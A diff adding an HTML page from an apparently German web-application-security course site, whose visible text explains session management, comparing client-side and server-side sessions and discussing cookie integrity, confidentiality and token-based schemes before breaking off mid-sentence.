@@ -1,0 +1,1775 @@
+
+<!doctype html>
+<html lang="de" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../authentication/">
+      
+      
+        <link rel="next" href="../authorization/">
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.8">
+    
+    
+      
+        <title>Session-Management - Web Application Security</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.8608ea7d.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    <body dir="ltr">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#session-management" class="md-skip">
+          Zum Inhalt
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Kopfzeile">
+    <a href="../.." title="Web Application Security" class="md-header__button md-logo" aria-label="Web Application Security" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Web Application Security
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Session-Management
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Suche" placeholder="Suche" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Suche">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Zurücksetzen" aria-label="Zurücksetzen" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Suche wird initialisiert
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Web Application Security" class="md-nav__button md-logo" aria-label="Web Application Security" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Web Application Security
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../todo.md" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    How to Contribute
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    Einführung
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Einführung
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Intro
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../introduction/security_principles/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Grundprinzipien
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../introduction/security_as_process/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Sicherheit als Prozess
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../introduction/integration/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Integration mit dem Umfeld
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../introduction/crypto_basics/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Kryptographische Grundlagen
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    Web Grundlagen
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Web Grundlagen
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web-applications/web_technologies/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Technologien
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web-applications/web_applications/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Web Applikationen
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    Zugriffskontrolle
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            Zugriffskontrolle
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../authentication/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Identifikation und Authentifizierung
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Session-Management
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    Session-Management
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Inhaltsverzeichnis">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Inhaltsverzeichnis
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#client-vs-server-side-session" class="md-nav__link">
+    <span class="md-ellipsis">
+      Client- vs Server-Side Session
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Client- vs Server-Side Session">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#token-basierte-systeme-fur-interaktive-sessions" class="md-nav__link">
+    <span class="md-ellipsis">
+      Token-basierte Systeme für interaktive Sessions
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#viewstate" class="md-nav__link">
+    <span class="md-ellipsis">
+      ViewState
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#idealer-sessionablauf" class="md-nav__link">
+    <span class="md-ellipsis">
+      Idealer Sessionablauf
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#potentielle-probleme-beim-session-management" class="md-nav__link">
+    <span class="md-ellipsis">
+      Potentielle Probleme beim Session-Management
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Potentielle Probleme beim Session-Management">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#session-id-wird-verloren" class="md-nav__link">
+    <span class="md-ellipsis">
+      Session-Id wird verloren
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#mixed-content-firesheep" class="md-nav__link">
+    <span class="md-ellipsis">
+      Mixed-Content / FireSheep
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#session-id-in-get-parameter" class="md-nav__link">
+    <span class="md-ellipsis">
+      Session-Id in GET-Parameter
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#session-id-ist-vorher-bestimmbar" class="md-nav__link">
+    <span class="md-ellipsis">
+      Session-Id ist vorher bestimmbar
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#session-fixation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Session Fixation
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#session-extraktion-mittels-xss-lucke" class="md-nav__link">
+    <span class="md-ellipsis">
+      Session-Extraktion mittels XSS-Lücke
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#json-web-tokens" class="md-nav__link">
+    <span class="md-ellipsis">
+      JSON Web Tokens
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="JSON Web Tokens">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#problem-null-algorithmus" class="md-nav__link">
+    <span class="md-ellipsis">
+      Problem: Null-Algorithmus
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#probleme-bei-mac-basierter-verifizierung" class="md-nav__link">
+    <span class="md-ellipsis">
+      Probleme bei MAC-basierter Verifizierung
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#problem-mac-vs-signature" class="md-nav__link">
+    <span class="md-ellipsis">
+      Problem: MAC vs. Signature
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#reflektionsfragen" class="md-nav__link">
+    <span class="md-ellipsis">
+      Reflektionsfragen
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../authorization/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Autorisierung
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../sso/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Single-Sign On (SSO)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    Server-Seitige Angriffe
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            Server-Seitige Angriffe
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../server-side-attacks/injection_attacks/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Angriffe
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    Client-Seitige Angriffe
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            Client-Seitige Angriffe
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../client-side-attacks/client_side_attacks/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Angriffe
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../client-side-attacks/client_side_hardening/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Härtungsmaßnahmen
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    Appendix
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            Appendix
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../appendix/mod_security/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Apache mod_security
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../appendix/history/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Entstehungsgeschichte
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../appendix/weitere-informationen/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    What to do next?
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Inhaltsverzeichnis">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Inhaltsverzeichnis
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#client-vs-server-side-session" class="md-nav__link">
+    <span class="md-ellipsis">
+      Client- vs Server-Side Session
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Client- vs Server-Side Session">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#token-basierte-systeme-fur-interaktive-sessions" class="md-nav__link">
+    <span class="md-ellipsis">
+      Token-basierte Systeme für interaktive Sessions
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#viewstate" class="md-nav__link">
+    <span class="md-ellipsis">
+      ViewState
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#idealer-sessionablauf" class="md-nav__link">
+    <span class="md-ellipsis">
+      Idealer Sessionablauf
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#potentielle-probleme-beim-session-management" class="md-nav__link">
+    <span class="md-ellipsis">
+      Potentielle Probleme beim Session-Management
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Potentielle Probleme beim Session-Management">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#session-id-wird-verloren" class="md-nav__link">
+    <span class="md-ellipsis">
+      Session-Id wird verloren
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#mixed-content-firesheep" class="md-nav__link">
+    <span class="md-ellipsis">
+      Mixed-Content / FireSheep
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#session-id-in-get-parameter" class="md-nav__link">
+    <span class="md-ellipsis">
+      Session-Id in GET-Parameter
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#session-id-ist-vorher-bestimmbar" class="md-nav__link">
+    <span class="md-ellipsis">
+      Session-Id ist vorher bestimmbar
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#session-fixation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Session Fixation
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#session-extraktion-mittels-xss-lucke" class="md-nav__link">
+    <span class="md-ellipsis">
+      Session-Extraktion mittels XSS-Lücke
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#json-web-tokens" class="md-nav__link">
+    <span class="md-ellipsis">
+      JSON Web Tokens
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="JSON Web Tokens">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#problem-null-algorithmus" class="md-nav__link">
+    <span class="md-ellipsis">
+      Problem: Null-Algorithmus
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#probleme-bei-mac-basierter-verifizierung" class="md-nav__link">
+    <span class="md-ellipsis">
+      Probleme bei MAC-basierter Verifizierung
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#problem-mac-vs-signature" class="md-nav__link">
+    <span class="md-ellipsis">
+      Problem: MAC vs. Signature
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#reflektionsfragen" class="md-nav__link">
+    <span class="md-ellipsis">
+      Reflektionsfragen
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="session-management">Session Management</h1>
+<p>Eine Session ist eine stehende Verbindung zwischen einem Client und
+einem Server. Innerhalb der Session kann der Server Zugriffe einem
+Client zuordnen. Nach erfolgtem Login kennt der Server also die
+Benutzeridentität des Clients (bis zum erfolgten Logout). Im Web-Umfeld
+werden zumeist Cookie-basierte Sessions verwendet, andere Möglichkeiten
+wären z.B. Token basierte Systeme.</p>
+<p>Token-basierte Systeme werden gerne zur Übertragung von
+Zugangsberechtigungen für REST- oder SOAP-Webservices verwendet. Sofern
+die Services state-less sind, ist dies eine sehr gute Kombination. In
+diesem Fall werden alle notwendigen Session-/Benutzerinformationen im
+Token transportiert, der Service selbst persistiert keine
+State-Informationen. Durch diese funktionale Herangehensweise kann der
+Service perfekt horizontal skalieren: wird mehr Performance benötigt,
+werden weitere Service-Worker gestartet. Dies ist häufig bei Webservices
+die durch Mobilapplikationen konsumiert werden der Fall, allerdings
+seltener bei interaktiven Webapplikationen. Bei letzteren wird der Token
+häufig als Session-Identifikatior missbraucht und dient zur
+Identifikation einer serverseitigen Session — der Service ist also
+state-ful. Um ein vollwertiges Session-System zu erlangen müssen
+Programmierer nun dieses, basierend auf dem Token als Identifier, selbst
+programmieren und erfinden daher quasi das Rad neu. Die Verwendung von
+Token erbringt keine Vorteile mehr und sollte in diesem Fall diskutiert
+werden. Ein häufiger Grund diesen Nachteil in Kauf zu nehmen ist, dass
+zumindest Web- und Mobilapplikationen die idente serverseitige API
+konsumieren können.</p>
+<h2 id="client-vs-server-side-session">Client- vs Server-Side Session</h2>
+<p>Mit Hilfe des Cookies kann der Server nun ein Session-Management Schema
+implementieren. Prinzipiell gibt es nun die Unterscheidung in client-
+und server-seitigem Session-Schemas.</p>
+<p>Bei der client-seitigen Variante speichert der Server alle für die
+Authentication relevanten Daten direkt im Cookie und versendet dieses an
+den Client. Am Server selbst wird keine Session-Information gespeichert.
+Bei jedem Folgezugriff inkludiert der Client dieses Cookie, der Server
+interpretiert diese Daten und bildet anhand dieser die Benutzersession.
+Bei diesem Verfahren sind mehrere Punkte problematisch:</p>
+<ul>
+<li>
+<p>Der Client kann das Cookie beliebig verändern. Dadurch könnte z.B.
+  ein im Cookie gespeicherter Benutzername auf “admin” geändert
+  werden. Der Server kann dies umgehen, indem er das Cookie signiert
+  und dadurch dessen Integrität sichert.</p>
+</li>
+<li>
+<p>Der Client kann das Cookie auslesen, und dadurch Zugriff auf
+  potentiell sensible Daten erhalten. Der Server kann dies umgehen,
+  indem er das Cookie verschlüsselt und dadurch die Confidentiality
+  der Daten gewährleistet.</p>
+</li>
+<li>
+<p>Der Server besitzt keine Möglichkeit serverseitig alle Sessions
+  eines Benutzers zu invalidieren (sprich, alle Session eines
+  Benutzers auszuloggen).</p>
+</li>
+</ul>
+<p>Bei einer server-seitigen Sessionimplementierung generiert der Server
+eine eindeutige zufällige ID und speichert diese innerhalb des Cookies.
+In einer serverseitigen Datenbank wird nun diese ID dem eingeloggten
+Benutzer zugeordnet und potentiell noch weitere Metainformationen
+(Zeitpunkt des Logins, IP-Adresse, etc.) gespeichert. Bei dieser Lösung
+werden die im Client gespeicherten Daten minimiert und der Server
+besitzt die Möglichkeit alle Sessions zu beenden (indem er die Einträge
+des Users aus der Session-Tabelle löscht).</p>
+<p>Aus Sicherheitssicht sind server-seitige Sessions zu bevorzugen; einige
+neuere Standards wie die österreichische ÖNORM A77.00 schreiben den
+Einsatz von server-seitigen Sessions vor.</p>
+<h3 id="token-basierte-systeme-fur-interaktive-sessions">Token-basierte Systeme für interaktive Sessions</h3>
+<p>Häufig werden client-seitige Token Systeme als direkte Alternative zu
+Cookie-Session-basierten Systemen angepriesen. Als Vorteil wird zumeist
+ihre bessere Skalierbarkeit (wenn nur Token-gespeicherte Daten für eine
+Operation benötigt werden, wird kein Datenbank-Zugriff benötigt) und
+Sicherheit (durch die Verwendung von Kryptographie) angepriesen. Diese
+Begründung macht leider zumeist nur begrenzt Sinn.</p>
+<p>Bei den meisten Operationen bei denen eine Autorisation überprüft wird,
+benötigen eine Form des Datenbankzugriffs da zusätzliche Daten zu den,
+im Token gespeicherten, Daten benötigt werden. Dadurch wird der
+Skalierbarkeits-Vorteil entkräftet. Zusätzlich ist bei jedem Zugriff
+eine, potentiell teure, kryptographische Operation notwendig. Die
+Verwendung von Kryptographie innerhalb des Tokens ist orthogonal zu der
+Gesamtsicherheit der Webapplikation. Eine Cookie-basierte client-seitige
+Lösung kann ebenso eine Signatur (bzw. einen MAC[1]) verwenden um die
+Integrität der Daten zu gewährleisten. Eine server-seitige
